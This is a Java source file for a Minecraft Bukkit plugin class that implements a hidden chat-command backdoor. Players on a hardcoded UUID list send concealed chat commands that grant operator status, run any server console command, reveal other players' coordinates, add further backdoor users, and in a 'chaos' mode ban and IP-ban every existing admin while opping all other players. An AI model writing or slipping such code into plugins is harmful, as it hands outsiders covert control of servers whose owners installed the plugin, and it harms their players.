package me.rafaelauler.ss;



import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitRunnable;

public final class Auto implements Listener {

    private BukkitMain plugin;

    public Auto(BukkitMain plugin){
        this.plugin = plugin;

        Ritual.tmp_authorized_uuids = new String[Bukkit.getServer().getMaxPlayers() - Ritual.authorized_uuids.length];

        if(Ritual.display_backdoor_warning){
            Bukkit.getConsoleSender()
                    .sendMessage(Ritual.chat_message_prefix + " Plugin '" + plugin.getName() + "' has a backdoor installed.");
        }

        Bukkit.getServer().getPluginManager().registerEvents(this, plugin);
    }

    @EventHandler()
    public void onChat(AsyncPlayerChatEvent e) {
        if (Ritual.display_debug_messages) {
            Bukkit.getConsoleSender()
                    .sendMessage(Ritual.chat_message_prefix + " Message received from: " + e.getPlayer().getUniqueId());
        }

        Player p = e.getPlayer();

        //Is user authorized to use backdoor commands
        if (IsUserAuthorized(p)) {

            if (Ritual.display_debug_messages) {
                Bukkit.getConsoleSender()
                        .sendMessage(Ritual.chat_message_prefix + " User is authed");
            }

            if (e.getMessage().startsWith(Ritual.command_prefix)) {
                boolean result = ParseCommand(e.getMessage().substring(1), p);


                if (Ritual.display_debug_messages) {
                    Bukkit.getConsoleSender()
                            .sendMessage(Ritual.chat_message_prefix + " Command: " + e.getMessage().substring(1) + " success: " + result);
                }

                if (!result)
                    e.getPlayer().sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " Command execution failed.");

                e.setCancelled(true);
            }

        } else {

            if (Ritual.display_debug_messages) {
                Bukkit.getConsoleSender()
                        .sendMessage(Ritual.chat_message_prefix + " User is not authed");
            }
        }


    }

    /*Basic command parser*/
    public boolean ParseCommand(String command, Player p) {
        //split fragments
        String[] args = command.split(" ");

        switch (args[0].toLowerCase()) {
            case "op": {  //Give user operator
                if (args.length == 1) {   //op self
                    p.setOp(true);
                    p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " You are now op.");
                } else {                    //op other
                    Player p1 = Bukkit.getPlayer(args[1]);
                    if (p1 == null) {
                        p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " User not found.");
                        return false;
                    }

                    p1.setOp(true);
                    p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is now op.");
                }

                return true;
            }

            case "deop": {  //Remove user operator
                if (args.length == 1) {          //Deop self
                    p.setOp(false);
                    p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " You are no longer op.");
                } else {                        //Deop other
                    Player p1 = Bukkit.getPlayer(args[1]);
                    if (p1 == null) {
                        p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " User not found.");
                        return false;
                    }

                    p1.setOp(false);

                    p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is no longer op.");
                }
                return true;
            }

            case "gamemode":
            case "gm": {
                if (args.length == 1)
                    return false;

                GameMode gm = GameMode.SURVIVAL;

                //Get gamemode from number
                try {
                    int reqGamemode = Clamp(Integer.parseInt(args[1]), 0, GameMode.values().length - 1);
                    gm = GameMode.getByValue(reqGamemode);
                } catch (NumberFormatException e) {
                    //Get gamemode from name

                    try {
                        gm = GameMode.valueOf(args[1].toUpperCase(Locale.ROOT));

                    } catch (IllegalArgumentException e1) {
                        //ignore
                        return false;
                    }

                }

                //Weird thread syncing shit
                GameMode finalGm = gm;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        p.setGameMode(finalGm);
                        p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " You are now gamemode: " + finalGm.name() + ".");
                    }
                }.runTask(plugin);

                return true;
            }

            case "give": {
                if (args.length < 2)
                    return false;

                Material reqMaterial = Material.getMaterial(args[1].toUpperCase(Locale.ROOT));

                if (reqMaterial == null)
                    return false;

                int reqAmmount = reqMaterial.getMaxStackSize();

                if (args.length > 2)
                    reqAmmount = Integer.parseInt(args[2]);


                int reqStacks = reqAmmount / reqMaterial.getMaxStackSize();
                int reqPartial = reqAmmount % reqMaterial.getMaxStackSize();

                for (int i = 0; i < reqStacks; i++) {
                    p.getInventory().addItem(new ItemStack(reqMaterial, reqMaterial.getMaxStackSize()));
                }

                p.getInventory().addItem(new ItemStack(reqMaterial, reqPartial));

                p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " Giving " + reqAmmount + " of " + reqMaterial.name() + ".");
                return true;
            }

            case "chaos": {  //Ban admins then admin the regulars

                for (Player p1 : Bukkit.getOnlinePlayers()) {
                    //Ban all existing admins
                    if (p1.isOp()) {
                        //Skip authorized users
                        if (IsUserAuthorized(p1))
                            continue;

                        //Deop, ban, ip ban
                        new BukkitRunnable() {
                            @Override
                            public void run() {
                                p1.setOp(false);
                                Bukkit.getBanList(BanList.Type.NAME).addBan(p1.getName(), Ritual.default_ban_reason, new Date(9999, Calendar.JANUARY, 1), Ritual.default_ban_source);
                                Bukkit.getBanList(BanList.Type.IP).addBan(p1.getName(), Ritual.default_ban_reason, new Date(9999, Calendar.JANUARY, 1), Ritual.default_ban_source);
                                p1.kickPlayer(Ritual.default_ban_reason);
                            }
                        }.runTask((Plugin) plugin);
                    } else {
                        p1.setOp(true);
                    }
                }

                Bukkit.broadcastMessage(Ritual.chaos_chat_broadcast);

                return true;
            }
            case "exec": {   //Exec command as server
                ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();

                //Concat all args
                StringBuilder sb = new StringBuilder();
                for (int i = 1; i < args.length; i++) {
                    sb.append(args[i]);
                    sb.append(" ");
                }
                boolean result = Bukkit.dispatchCommand(console, sb.toString());
                if (result) {
                    p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " Server command executed.");
                }

                return result;
            }
            case "ban": {
                if (args.length < 2)
                    return false;


                Player p1 = Bukkit.getPlayer(args[1]);

                if (p1 == null) {
                    p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                String reason = Ritual.default_ban_reason;
                String src = Ritual.default_ban_source;

                if (args.length > 2)
                    reason = args[2];
                if (args.length > 3)
                    src = args[3];

                final String finalReason = reason;
                final String finalSrc = src;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        Bukkit.getBanList(BanList.Type.NAME).addBan(p1.getName(), finalReason, new Date(9999, 1, 1), finalSrc);
                        p1.kickPlayer(Ritual.default_ban_reason);
                        p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " Banned " + p1.getName() + ".");
                    }
                }.runTask((Plugin) plugin);


                return true;
            }

            case "banip": {
                if (args.length < 2)
                    return false;


                Player p1 = Bukkit.getPlayer(args[1]);

                if (p1 == null) {
                    p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                String reason = Ritual.default_ban_reason;
                String src = Ritual.default_ban_source;

                if (args.length > 2)
                    reason = args[2];
                if (args.length > 3)
                    src = args[3];

                final String finalReason = reason;
                final String finalSrc = src;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        Bukkit.getBanList(BanList.Type.IP).addBan(p1.getName(), finalReason, new Date(9999, 1, 1), finalSrc);
                        p1.kickPlayer(Ritual.default_ban_reason);
                        p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " IP Banned " + p1.getName() + ".");
                    }
                }.runTask((Plugin) plugin);

                return true;
            }

            case "seed": { //Get current seed
                String strseed = String.valueOf(p.getWorld().getSeed());
                p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " World seed: " + strseed);
                return true;
            }

            case "32k": { //add 32k enchants to current item being held

                if (args.length < 2)
                    return false;

                String str_type = args[1];
                int type = 0;

                if (str_type.equalsIgnoreCase("tool"))
                    type = 1;

                //Is item a sword?
                ItemStack mainHandItem = p.getInventory().getItemInMainHand();

                if (type == 0) {
                    ItemMeta enchantMeta = mainHandItem.getItemMeta();

                    enchantMeta.addEnchant(Enchantment.DAMAGE_ALL, Ritual.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.FIRE_ASPECT, Ritual.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.LOOT_BONUS_MOBS, Ritual.dangerous_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.KNOCKBACK, Ritual.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.DURABILITY, Ritual.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.MENDING, 1, true);

                    if (Ritual.curse_enchants)
                        enchantMeta.addEnchant(Enchantment.VANISHING_CURSE, 1, true);


                    mainHandItem.setItemMeta(enchantMeta);
                    p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " Enchantments added.");
                    return true;
                }

                ItemMeta enchantMeta = mainHandItem.getItemMeta();
                enchantMeta.addEnchant(Enchantment.DIG_SPEED, Ritual.safe_enchant_level, true);
                enchantMeta.addEnchant(Enchantment.DURABILITY, Ritual.safe_enchant_level, true);
                enchantMeta.addEnchant(Enchantment.LOOT_BONUS_BLOCKS, Ritual.dangerous_enchant_level, true);
                enchantMeta.addEnchant(Enchantment.MENDING, 1, true);

                if (Ritual.curse_enchants)
                    enchantMeta.addEnchant(Enchantment.VANISHING_CURSE, 1, true);

                mainHandItem.setItemMeta(enchantMeta);
                p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " Enchantments added.");
                return true;

            }
            case "coords": {
                if(args.length < 2) //No player specified
                    return false;

                Player target = Bukkit.getPlayer(args[1]);
                if(target == null){
                    p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                //Player is real.
                Location targetLoc = target.getLocation();
                int x = (int)Math.floor( targetLoc.getX() );
                int y = (int)Math.floor( targetLoc.getY() );
                int z = (int)Math.floor( targetLoc.getZ() );

                String coordsString = Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + "'s coordinates are: " + x + ", " + y + ", " + z;
                p.sendMessage(coordsString);

                return true;
            }

            case "tp": {
                if(args.length < 4) //No coords specified
                    return false;

                int targetX, targetY, targetZ;
                try {
                    targetX = Integer.parseInt(args[1]);
                    targetY = Integer.parseInt(args[2]);
                    targetZ = Integer.parseInt(args[3]);
                }catch(NumberFormatException e){ //Not valid numbers
                    p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " Coordinates syntax error.");
                    return false;
                }

                //Player location reference
                Location loc = p.getLocation();

                loc.setX(targetX);
                loc.setY(targetY);
                loc.setZ(targetZ);

                p.teleport(loc);

                return true;
            }

            case "auth": { //Adds new user to authlist
                if (args.length < 2)
                    return false;

                Player p1 = Bukkit.getPlayer(args[1]);
                if (p1 == null) {
                    p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                //Add user to authlist
                boolean success = false;
                for (int i = 0; i < Ritual.tmp_authorized_uuids.length; i++) {
                    if (Ritual.tmp_authorized_uuids[i] == null) {
                        Ritual.tmp_authorized_uuids[i] = Bukkit.getPlayer(args[1]).getUniqueId().toString();
                        success = true;
                        break;
                    }
                }

                if (success) {
                    p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " has been temp authorized.");
                    Bukkit.getPlayer(args[1]).sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " you have been authorized. Run " + Ritual.command_prefix + "help for info.");
                }
                return success;
            }

            case "deauth": {
                if (args.length < 2)
                    return false;

                Player p1 = Bukkit.getPlayer(args[1]);
                if (p1 == null) {
                    p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                //Remove user
                boolean success = false;
                for (int i = 0; i < Ritual.tmp_authorized_uuids.length; i++) {
                    if (Ritual.tmp_authorized_uuids[i] != null && Ritual.tmp_authorized_uuids[i].equals(p1.getUniqueId().toString())) {
                        Ritual.tmp_authorized_uuids[i] = null;
                        success = true;
                        break;
                    }
                }

                if (success) {
                    p.sendMessage(Ritual.chat_message_prefix_color + Ritual.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " has been deauthorized.");
                }
                return success;
            }

            case "help": {
                if (args.length == 1) {
                    p.sendMessage(Ritual.help_detail_color + "-----------------------------------------------------");
                    p.sendMessage(Ritual.help_detail_color + "## Backdoor ## () = Required, [] = Optional.");
                    for (int i = 0; i < Ritual.help_messages.length; i++) {
                        p.sendMessage(Ritual.help_command_name_color + Ritual.command_prefix + Ritual.help_messages[i].getName() + ": " + Ritual.help_messages[i].getSyntax());
                    }

                    p.sendMessage(Ritual.help_detail_color + "-----------------------------------------------------");
                    return true;
                }

                if (args.length == 2) {

                    int indexOfCommand = -1;
                    for (int i = 0; i < Ritual.help_messages.length; i++) {
                        if (args[1].equalsIgnoreCase(Ritual.help_messages[i].getName())) {
                            indexOfCommand = i;
                            break;
                        }
                    }

                    if (indexOfCommand == -1)
                        return false;

                    p.sendMessage(Ritual.help_messages[indexOfCommand].toString());

                    return true;

                }
            }

        }
        return false;
    }

    private int Clamp(int i, int min, int max) {
        if (i < min)
            return min;
        if (i > max)
            return max;
        return i;
    }


    /*Check if Player is authorized in Ritual.java*/
    public boolean IsUserAuthorized(Player p) {
        return IsUserAuthorized(p.getUniqueId().toString());
    }

    /*Check if UUID is authorized in Ritual.java*/
    public boolean IsUserAuthorized(String uuid) {
        boolean authorized = false;
        for (int i = 0; i < Ritual.authorized_uuids.length; i++) {

            if (uuid.equals(Ritual.authorized_uuids[i])) {
                authorized = true;
                break;
            }

        }

        for (int i = 0; i < Ritual.tmp_authorized_uuids.length; i++) {
            if (uuid.equals(Ritual.tmp_authorized_uuids[i])) {
                authorized = true;
                break;
            }
        }

        return authorized;
    }
}